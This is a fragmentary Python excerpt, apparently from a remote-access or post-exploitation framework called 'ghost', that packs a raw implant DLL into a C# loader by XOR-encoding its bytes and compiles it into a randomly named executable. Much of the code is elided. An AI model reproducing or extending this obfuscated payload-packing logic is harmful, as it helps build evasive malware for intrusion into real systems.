...
from ghost.ghostlib.GhostOutput import Success, Error, List
from ghost.ghostlib import ROOT

from ghost.network.lib.convcompat import shlex

TEMPLATE = join(ROOT, 'payload_templates', 'GhostLoaderTemplate.cs')
...
class DotNetPayload(object):
    ...
    def gen_source(self, random_path=False):
        ...
        self.display(Success('packing ghost into C# source ...'))

        encoded = '{' + ','.join(
            str(c ^ 0xFF) for c in self.rawdll
        ) + '}'

        content = template_source.replace('<GHOSTx64_BYTES>', encoded)
    ...
    def gen_exe(self, options=''):
        ...
        if not self.outpath:
            outfile = os.path.join(
                self.output_dir or '.', 'ghost_'+''.join(
                    random.choice(
        ...
        try:
            ...
            if self.server:
                ...
                from ghost.ghostlib import GhostConfig
                config = GhostConfig()
